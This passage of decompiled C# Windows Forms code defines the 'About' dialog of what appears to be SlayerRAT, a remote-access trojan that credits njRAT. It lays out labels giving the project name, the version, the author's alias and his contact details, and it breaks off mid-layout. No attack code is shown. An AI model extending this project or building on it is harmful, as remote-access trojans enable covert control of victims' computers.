using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class About_Coder : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		[AccessedThroughProperty("Label5")]
		private Label _Label5;

		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		[AccessedThroughProperty("Label7")]
		private Label _Label7;

		[AccessedThroughProperty("Label8")]
		private Label _Label8;

		[AccessedThroughProperty("Label9")]
		private Label _Label9;

		[AccessedThroughProperty("Label10")]
		private Label _Label10;

		[AccessedThroughProperty("Label11")]
		private Label _Label11;

		[AccessedThroughProperty("Label12")]
		private Label _Label12;

		[AccessedThroughProperty("Label13")]
		private Label _Label13;

		[AccessedThroughProperty("Label14")]
		private Label _Label14;

		[AccessedThroughProperty("Label15")]
		private Label _Label15;

		[AccessedThroughProperty("Label16")]
		private Label _Label16;

		[AccessedThroughProperty("Label17")]
		private Label _Label17;

		[AccessedThroughProperty("Label18")]
		private Label _Label18;

		[AccessedThroughProperty("Label19")]
		private Label _Label19;

		[AccessedThroughProperty("Label20")]
		private Label _Label20;

		[AccessedThroughProperty("Label21")]
		private Label _Label21;

		[AccessedThroughProperty("Label22")]
		private Label _Label22;

		[AccessedThroughProperty("Label23")]
		private Label _Label23;

		[AccessedThroughProperty("PictureBox2")]
		private PictureBox _PictureBox2;

		[AccessedThroughProperty("Label24")]
		private Label _Label24;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("Label25")]
		private Label _Label25;

		[AccessedThroughProperty("Label26")]
		private Label _Label26;

		[AccessedThroughProperty("Label27")]
		private Label _Label27;

		[AccessedThroughProperty("Label28")]
		private Label _Label28;

		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		[AccessedThroughProperty("WaterFX1")]
		private WaterFX _WaterFX1;

		[AccessedThroughProperty("LinkLabel1")]
		private LinkLabel _LinkLabel1;

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		internal virtual Label Label7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label7 = value;
			}
		}

		internal virtual Label Label8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label8 = value;
			}
		}

		internal virtual Label Label9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label9 = value;
			}
		}

		internal virtual Label Label10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label10 = value;
			}
		}

		internal virtual Label Label11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label11 = value;
			}
		}

		internal virtual Label Label12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label12 = value;
			}
		}

		internal virtual Label Label13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label13 = value;
			}
		}

		internal virtual Label Label14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label14 = value;
			}
		}

		internal virtual Label Label15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label15 = value;
			}
		}

		internal virtual Label Label16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Label16_Click);
				bool flag = this._Label16 != null;
				if (flag)
				{
					this._Label16.Click -= value2;
				}
				this._Label16 = value;
				flag = (this._Label16 != null);
				if (flag)
				{
					this._Label16.Click += value2;
				}
			}
		}

		internal virtual Label Label17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label17 = value;
			}
		}

		internal virtual Label Label18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label18 = value;
			}
		}

		internal virtual Label Label19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label19 = value;
			}
		}

		internal virtual Label Label20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label20 = value;
			}
		}

		internal virtual Label Label21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label21 = value;
			}
		}

		internal virtual Label Label22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label22 = value;
			}
		}

		internal virtual Label Label23
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label23;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label23 = value;
			}
		}

		internal virtual PictureBox PictureBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox2 = value;
			}
		}

		internal virtual Label Label24
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label24;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label24 = value;
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual Label Label25
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label25;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label25 = value;
			}
		}

		internal virtual Label Label26
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label26;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label26 = value;
			}
		}

		internal virtual Label Label27
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label27;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label27 = value;
			}
		}

		internal virtual Label Label28
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label28;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label28 = value;
			}
		}

		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		internal virtual WaterFX WaterFX1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._WaterFX1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._WaterFX1 = value;
			}
		}

		internal virtual LinkLabel LinkLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LinkLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LinkLabel1 = value;
			}
		}

		[DebuggerNonUserCode]
		public About_Coder()
		{
			base.FormClosing += new FormClosingEventHandler(this.Coder_FormClosing);
			base.Load += new EventHandler(this.Coder_Load);
			base.MouseLeave += new EventHandler(this.About_Coder_MouseLeave);
			About_Coder.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = About_Coder.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = About_Coder.__ENCList.Count == About_Coder.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = About_Coder.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = About_Coder.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									About_Coder.__ENCList[num] = About_Coder.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						About_Coder.__ENCList.RemoveRange(num, About_Coder.__ENCList.Count - num);
						About_Coder.__ENCList.Capacity = About_Coder.__ENCList.Count;
					}
					About_Coder.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(About_Coder));
			this.Timer1 = new Timer(this.components);
			this.Label2 = new Label();
			this.Label3 = new Label();
			this.Label4 = new Label();
			this.Label5 = new Label();
			this.Label6 = new Label();
			this.Label7 = new Label();
			this.Label8 = new Label();
			this.Label9 = new Label();
			this.Label10 = new Label();
			this.Label11 = new Label();
			this.Label12 = new Label();
			this.Label13 = new Label();
			this.Label14 = new Label();
			this.Label15 = new Label();
			this.Label16 = new Label();
			this.Label17 = new Label();
			this.Label18 = new Label();
			this.Label19 = new Label();
			this.Label20 = new Label();
			this.Label21 = new Label();
			this.Label22 = new Label();
			this.Label23 = new Label();
			this.PictureBox2 = new PictureBox();
			this.Label24 = new Label();
			this.PictureBox1 = new PictureBox();
			this.Label25 = new Label();
			this.Label26 = new Label();
			this.Label27 = new Label();
			this.Label28 = new Label();
			this.Timer2 = new Timer(this.components);
			this.LinkLabel1 = new LinkLabel();
			this.WaterFX1 = new WaterFX();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.SuspendLayout();
			this.Timer1.Interval = 150;
			this.Label2.AutoSize = true;
			this.Label2.BackColor = Color.Transparent;
			this.Label2.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label2.ForeColor = Color.Yellow;
			Control arg_247_0 = this.Label2;
			Point location = new Point(993, 69);
			arg_247_0.Location = location;
			Control arg_261_0 = this.Label2;
			Padding margin = new Padding(5, 0, 5, 0);
			arg_261_0.Margin = margin;
			this.Label2.Name = "Label2";
			Control arg_28C_0 = this.Label2;
			Size size = new Size(94, 20);
			arg_28C_0.Size = size;
			this.Label2.TabIndex = 2;
			this.Label2.Text = "Information";
			this.Label3.AutoSize = true;
			this.Label3.BackColor = Color.Transparent;
			this.Label3.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label3.ForeColor = Color.White;
			Control arg_313_0 = this.Label3;
			location = new Point(1017, 113);
			arg_313_0.Location = location;
			Control arg_32D_0 = this.Label3;
			margin = new Padding(5, 0, 5, 0);
			arg_32D_0.Margin = margin;
			this.Label3.Name = "Label3";
			Control arg_358_0 = this.Label3;
			size = new Size(46, 13);
			arg_358_0.Size = size;
			this.Label3.TabIndex = 3;
			this.Label3.Text = "Project:";
			this.Label4.AutoSize = true;
			this.Label4.BackColor = Color.Transparent;
			this.Label4.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label4.ForeColor = Color.White;
			Control arg_3E2_0 = this.Label4;
			location = new Point(1017, 150);
			arg_3E2_0.Location = location;
			Control arg_3FC_0 = this.Label4;
			margin = new Padding(5, 0, 5, 0);
			arg_3FC_0.Margin = margin;
			this.Label4.Name = "Label4";
			Control arg_427_0 = this.Label4;
			size = new Size(49, 13);
			arg_427_0.Size = size;
			this.Label4.TabIndex = 4;
			this.Label4.Text = "Version:";
			this.Label5.AutoSize = true;
			this.Label5.BackColor = Color.Transparent;
			this.Label5.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label5.ForeColor = Color.White;
			Control arg_4B1_0 = this.Label5;
			location = new Point(1017, 189);
			arg_4B1_0.Location = location;
			Control arg_4CB_0 = this.Label5;
			margin = new Padding(5, 0, 5, 0);
			arg_4CB_0.Margin = margin;
			this.Label5.Name = "Label5";
			Control arg_4F6_0 = this.Label5;
			size = new Size(60, 13);
			arg_4F6_0.Size = size;
			this.Label5.TabIndex = 5;
			this.Label5.Text = "Coded By:";
			this.Label6.AutoSize = true;
			this.Label6.BackColor = Color.Transparent;
			this.Label6.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label6.ForeColor = Color.White;
			Control arg_580_0 = this.Label6;
			location = new Point(1017, 301);
			arg_580_0.Location = location;
			Control arg_59A_0 = this.Label6;
			margin = new Padding(5, 0, 5, 0);
			arg_59A_0.Margin = margin;
			this.Label6.Name = "Label6";
			Control arg_5C5_0 = this.Label6;
			size = new Size(53, 13);
			arg_5C5_0.Size = size;
			this.Label6.TabIndex = 6;
			this.Label6.Text = "Logo By:";
			this.Label7.AutoSize = true;
			this.Label7.BackColor = Color.Transparent;
			this.Label7.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label7.ForeColor = Color.RoyalBlue;
			Control arg_64C_0 = this.Label7;
			location = new Point(1098, 113);
			arg_64C_0.Location = location;
			Control arg_666_0 = this.Label7;
			margin = new Padding(5, 0, 5, 0);
			arg_666_0.Margin = margin;
			this.Label7.Name = "Label7";
			Control arg_691_0 = this.Label7;
			size = new Size(59, 13);
			arg_691_0.Size = size;
			this.Label7.TabIndex = 7;
			this.Label7.Text = "SlayerRAT";
			this.Label8.AutoSize = true;
			this.Label8.BackColor = Color.Transparent;
			this.Label8.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label8.ForeColor = Color.DeepPink;
			Control arg_71B_0 = this.Label8;
			location = new Point(1098, 150);
			arg_71B_0.Location = location;
			Control arg_735_0 = this.Label8;
			margin = new Padding(5, 0, 5, 0);
			arg_735_0.Margin = margin;
			this.Label8.Name = "Label8";
			Control arg_760_0 = this.Label8;
			size = new Size(105, 13);
			arg_760_0.Size = size;
			this.Label8.TabIndex = 8;
			this.Label8.Text = "0.8-Golden version";
			this.Label9.AutoSize = true;
			this.Label9.BackColor = Color.Transparent;
			this.Label9.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label9.ForeColor = Color.CornflowerBlue;
			Control arg_7EA_0 = this.Label9;
			location = new Point(1123, 189);
			arg_7EA_0.Location = location;
			Control arg_804_0 = this.Label9;
			margin = new Padding(5, 0, 5, 0);
			arg_804_0.Margin = margin;
			this.Label9.Name = "Label9";
			Control arg_82F_0 = this.Label9;
			size = new Size(58, 13);
			arg_82F_0.Size = size;
			this.Label9.TabIndex = 9;
			this.Label9.Text = "X-SLAYER";
			this.Label10.AutoSize = true;
			this.Label10.BackColor = Color.Transparent;
			this.Label10.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label10.ForeColor = Color.CornflowerBlue;
			Control arg_8BA_0 = this.Label10;
			location = new Point(1103, 303);
			arg_8BA_0.Location = location;
			Control arg_8D4_0 = this.Label10;
			margin = new Padding(5, 0, 5, 0);
			arg_8D4_0.Margin = margin;
			this.Label10.Name = "Label10";
			Control arg_8FF_0 = this.Label10;
			size = new Size(23, 13);
			arg_8FF_0.Size = size;
			this.Label10.TabIndex = 10;
			this.Label10.Text = "JM";
			this.Label11.AutoSize = true;
			this.Label11.BackColor = Color.Transparent;
			this.Label11.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label11.ForeColor = Color.CornflowerBlue;
			Control arg_98A_0 = this.Label11;
			location = new Point(1172, 340);
			arg_98A_0.Location = location;
			Control arg_9A4_0 = this.Label11;
			margin = new Padding(5, 0, 5, 0);
			arg_9A4_0.Margin = margin;
			this.Label11.Name = "Label11";
			Control arg_9CF_0 = this.Label11;
			size = new Size(91, 13);
			arg_9CF_0.Size = size;
			this.Label11.TabIndex = 12;
			this.Label11.Text = "Tunisia (Sousse)";
			this.Label12.AutoSize = true;
			this.Label12.BackColor = Color.Transparent;
			this.Label12.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label12.ForeColor = Color.White;
			Control arg_A5A_0 = this.Label12;
			location = new Point(1017, 340);
			arg_A5A_0.Location = location;
			Control arg_A74_0 = this.Label12;
			margin = new Padding(5, 0, 5, 0);
			arg_A74_0.Margin = margin;
			this.Label12.Name = "Label12";
			Control arg_A9F_0 = this.Label12;
			size = new Size(90, 13);
			arg_A9F_0.Size = size;
			this.Label12.TabIndex = 11;
			this.Label12.Text = "Point OF Origin:";
			this.Label13.AutoSize = true;
			this.Label13.BackColor = Color.Transparent;
			this.Label13.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label13.ForeColor = Color.Yellow;
			Control arg_B2A_0 = this.Label13;
			location = new Point(993, 449);
			arg_B2A_0.Location = location;
			Control arg_B44_0 = this.Label13;
			margin = new Padding(5, 0, 5, 0);
			arg_B44_0.Margin = margin;
			this.Label13.Name = "Label13";
			Control arg_B72_0 = this.Label13;
			size = new Size(177, 20);
			arg_B72_0.Size = size;
			this.Label13.TabIndex = 13;
			this.Label13.Text = "Fell Free To Contact Me:";
			this.Label14.AutoSize = true;
			this.Label14.BackColor = Color.Transparent;
			this.Label14.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label14.ForeColor = Color.White;
			Control arg_BFD_0 = this.Label14;
			location = new Point(1018, 492);
			arg_BFD_0.Location = location;
			Control arg_C17_0 = this.Label14;
			margin = new Padding(5, 0, 5, 0);
			arg_C17_0.Margin = margin;
			this.Label14.Name = "Label14";
			Control arg_C42_0 = this.Label14;
			size = new Size(43, 13);
			arg_C42_0.Size = size;
			this.Label14.TabIndex = 14;
			this.Label14.Text = "Gmail :";
			this.Label15.AutoSize = true;
			this.Label15.BackColor = Color.Transparent;
			this.Label15.Cursor = Cursors.Hand;
			this.Label15.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label15.ForeColor = Color.CornflowerBlue;
			Control arg_CDE_0 = this.Label15;
			location = new Point(1088, 492);
			arg_CDE_0.Location = location;
			Control arg_CF8_0 = this.Label15;
			margin = new Padding(5, 0, 5, 0);
			arg_CF8_0.Margin = margin;
			this.Label15.Name = "Label15";
			Control arg_D23_0 = this.Label15;
			size = new Size(126, 13);
			arg_D23_0.Size = size;
			this.Label15.TabIndex = 15;
			this.Label15.Text = "xslayer404@gmail.com";
			this.Label16.AutoSize = true;
			this.Label16.BackColor = Color.Transparent;
			this.Label16.Cursor = Cursors.Hand;
			this.Label16.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold | FontStyle.Underline, GraphicsUnit.Point, 0);
			this.Label16.ForeColor = Color.CornflowerBlue;
			Control arg_DBF_0 = this.Label16;
			location = new Point(1122, 568);
			arg_DBF_0.Location = location;
			Control arg_DD9_0 = this.Label16;
			margin = new Padding(5, 0, 5, 0);
			arg_DD9_0.Margin = margin;
			this.Label16.Name = "Label16";
			Control arg_E04_0 = this.Label16;
			size = new Size(58, 13);
			arg_E04_0.Size = size;
			this.Label16.TabIndex = 17;
			this.Label16.Text = "X-SLAYER";
			this.Label17.AutoSize = true;
			this.Label17.BackColor = Color.Transparent;
			this.Label17.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label17.ForeColor = Color.White;
			Control arg_E8F_0 = this.Label17;
			location = new Point(1018, 568);
			arg_E8F_0.Location = location;
			Control arg_EA9_0 = this.Label17;
			margin = new Padding(5, 0, 5, 0);
			arg_EA9_0.Margin = margin;
			this.Label17.Name = "Label17";
			Control arg_ED4_0 = this.Label17;
			size = new Size(58, 13);
			arg_ED4_0.Size = size;
			this.Label17.TabIndex = 16;
			this.Label17.Text = "Youtube :";
			this.Label18.AutoSize = true;
			this.Label18.BackColor = Color.Transparent;
			this.Label18.Cursor = Cursors.Hand;
			this.Label18.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold | FontStyle.Underline, GraphicsUnit.Point, 0);
			this.Label18.ForeColor = Color.CornflowerBlue;
			Control arg_F70_0 = this.Label18;
			location = new Point(1125, 527);
			arg_F70_0.Location = location;
			Control arg_F8A_0 = this.Label18;
			margin = new Padding(5, 0, 5, 0);
			arg_F8A_0.Margin = margin;
			this.Label18.Name = "Label18";
			Control arg_FB5_0 = this.Label18;
			size = new Size(56, 13);
			arg_FB5_0.Size = size;
			this.Label18.TabIndex = 19;
			this.Label18.Text = "Iheb Briki";
			this.Label19.AutoSize = true;
			this.Label19.BackColor = Color.Transparent;
			this.Label19.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label19.ForeColor = Color.White;
			Control arg_1040_0 = this.Label19;
			location = new Point(1018, 529);
			arg_1040_0.Location = location;
			Control arg_105A_0 = this.Label19;
			margin = new Padding(5, 0, 5, 0);
			arg_105A_0.Margin = margin;
			this.Label19.Name = "Label19";
			Control arg_1085_0 = this.Label19;
			size = new Size(63, 13);
			arg_1085_0.Size = size;
			this.Label19.TabIndex = 18;
			this.Label19.Text = "Facebook :";
			this.Label20.AutoSize = true;
			this.Label20.BackColor = Color.Transparent;
			this.Label20.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label20.ForeColor = Color.White;
			Control arg_1110_0 = this.Label20;
			location = new Point(1017, 377);
			arg_1110_0.Location = location;
			Control arg_112A_0 = this.Label20;
			margin = new Padding(5, 0, 5, 0);
			arg_112A_0.Margin = margin;
			this.Label20.Name = "Label20";
			Control arg_1155_0 = this.Label20;
			size = new Size(65, 13);
			arg_1155_0.Size = size;
			this.Label20.TabIndex = 20;
			this.Label20.Text = "Language :";
			this.Label21.AutoSize = true;
			this.Label21.BackColor = Color.Transparent;
			this.Label21.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label21.ForeColor = Color.CornflowerBlue;
			Control arg_11E0_0 = this.Label21;
			location = new Point(1135, 377);
			arg_11E0_0.Location = location;
			Control arg_11FA_0 = this.Label21;
			margin = new Padding(5, 0, 5, 0);
			arg_11FA_0.Margin = margin;
			this.Label21.Name = "Label21";
			Control arg_1225_0 = this.Label21;
			size = new Size(45, 13);
			arg_1225_0.Size = size;
			this.Label21.TabIndex = 21;
			this.Label21.Text = "English";
			this.Label22.AutoSize = true;
			this.Label22.BackColor = Color.Transparent;
			this.Label22.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label22.ForeColor = Color.White;
			Control arg_12B0_0 = this.Label22;
			location = new Point(1017, 414);
			arg_12B0_0.Location = location;
			Control arg_12CA_0 = this.Label22;
			margin = new Padding(5, 0, 5, 0);
			arg_12CA_0.Margin = margin;
			this.Label22.Name = "Label22";
			Control arg_12F5_0 = this.Label22;
			size = new Size(37, 13);
			arg_12F5_0.Size = size;
			this.Label22.TabIndex = 22;
			this.Label22.Text = "Font :";
			this.Label23.AutoSize = true;
			this.Label23.BackColor = Color.Transparent;
			this.Label23.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label23.ForeColor = Color.CornflowerBlue;
			Control arg_1380_0 = this.Label23;
			location = new Point(1088, 414);
			arg_1380_0.Location = location;
			Control arg_139A_0 = this.Label23;
			margin = new Padding(5, 0, 5, 0);
			arg_139A_0.Margin = margin;
			this.Label23.Name = "Label23";
			Control arg_13C5_0 = this.Label23;
			size = new Size(56, 13);
			arg_13C5_0.Size = size;
			this.Label23.TabIndex = 23;
			this.Label23.Text = "njRAT 0.5";
			this.PictureBox2.BackColor = Color.Transparent;
			this.PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
			Control arg_1430_0 = this.PictureBox2;
			location = new Point(1322, 331);
			arg_1430_0.Location = location;
			Control arg_1447_0 = this.PictureBox2;
			margin = new Padding(5);
			arg_1447_0.Margin = margin;
			this.PictureBox2.Name = "PictureBox2";
			Control arg_1472_0 = this.PictureBox2;
			size = new Size(48, 39);
			arg_1472_0.Size = size;
			this.PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox2.TabIndex = 24;
			this.PictureBox2.TabStop = false;
			this.Label24.AutoSize = true;
			this.Label24.BackColor = Color.Transparent;
			this.Label24.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label24.ForeColor = Color.White;
			Control arg_1506_0 = this.Label24;
			location = new Point(912, 630);
			arg_1506_0.Location = location;
			Control arg_1520_0 = this.Label24;
			margin = new Padding(5, 0, 5, 0);
			arg_1520_0.Margin = margin;
			this.Label24.Name = "Label24";
			Control arg_154E_0 = this.Label24;
			size = new Size(222, 13);
			arg_154E_0.Size = size;
			this.Label24.TabIndex = 25;
			this.Label24.Text = "Copyright© All Right Reserved 2015-2016";
			this.PictureBox1.BackColor = Color.Transparent;
			Control arg_159D_0 = this.PictureBox1;
			location = new Point(945, 334);
			arg_159D_0.Location = location;
			Control arg_15B4_0 = this.PictureBox1;
			margin = new Padding(5);
			arg_15B4_0.Margin = margin;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_15DF_0 = this.PictureBox1;
			size = new Size(62, 81);
			arg_15DF_0.Size = size;
			this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox1.TabIndex = 26;
			this.PictureBox1.TabStop = false;
			this.Label25.AutoSize = true;
			this.Label25.BackColor = Color.Transparent;
			this.Label25.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label25.ForeColor = Color.CornflowerBlue;
			Control arg_1673_0 = this.Label25;
			location = new Point(1113, 226);
			arg_1673_0.Location = location;
			Control arg_168D_0 = this.Label25;
			margin = new Padding(5, 0, 5, 0);
			arg_168D_0.Margin = margin;
			this.Label25.Name = "Label25";
			Control arg_16BB_0 = this.Label25;
			size = new Size(154, 13);
			arg_16BB_0.Size = size;
